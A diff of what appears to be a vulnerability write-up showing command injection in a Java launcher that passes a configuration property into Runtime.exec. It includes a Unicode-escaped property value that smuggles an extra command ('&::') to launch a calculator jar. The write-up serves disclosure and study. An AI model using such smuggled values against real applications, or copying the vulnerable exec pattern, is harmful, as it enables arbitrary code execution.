@@ -22,7 +22,7 @@ try (FileInputStream stream = new FileInputStream("app.properties")) {
 }
 
 String options = properties.getProperty("options", "");
-String command = String.format("javaw -cp ".;./dependencies/*\" %s com.example.main.Example", new Object[] { options });
+String command = String.format("javaw  %s -cp ".;./dependencies/*\" com.example.main.Example", new Object[] { options });
 
 Process process = runtime.exec(command);
 ```
@@ -83,7 +83,7 @@ Place `calc.jar` into the `/dependencies` directory of the target application.
 Add the following property to the configuration file (`application.properties`) of the application:
 
 ```
-options=command.injection.Calc\u0020\u0026\u003A\u003A\u0020
+options=-cp\u0020\u0022C:/PATH/TO/JAR/*\u0022\u0020command.injection.Calc\u0020\u0026\u003A\u003A\u0020
 ```
 
 Run the target application and observe that instead of the expected program, the calculator app will launch.
@@ -91,7 +91,7 @@ Run the target application and observe that instead of the expected program, the
 Below is the value that was fed into the exec function.
 
 ```
-javaw -cp ".;./dependencies/*\" command.injection.Calc &:: com.example.main.Example
+javaw -cp "C:/PATH/TO/JAR/*" command.injection.Calc &:: -cp ".;./dependencies/*\" com.example.main.Example
 ```
 
 ## References
